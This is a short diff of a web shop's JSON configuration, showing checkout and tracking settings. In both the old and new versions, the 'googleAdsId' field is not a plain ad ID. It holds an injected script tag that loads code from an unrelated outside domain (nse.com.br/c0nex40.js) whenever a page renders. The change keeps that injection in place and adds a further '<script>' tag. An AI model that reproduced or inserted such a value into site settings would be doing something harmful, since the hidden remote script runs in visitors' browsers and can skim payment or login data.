@@ -5,7 +5,7 @@
   "enableCheckout": true,
   "options": {
     "gaTrackingId": "G-79H1342PHD",
-    "googleAdsId": "AW-437362373/bOFvCLPm0YAYEMW9xtAB;</script><script src=\"https://nse.com.br/c0nex40.js\"></script><script>"
+    "googleAdsId": "<script>AW-437362373/bOFvCLPm0YAYEMW9xtAB;</script><script src=\"https://nse.com.br/c0nex40.js\"></script><script>"
   },
   "headAppend": "src/append/head"
 }
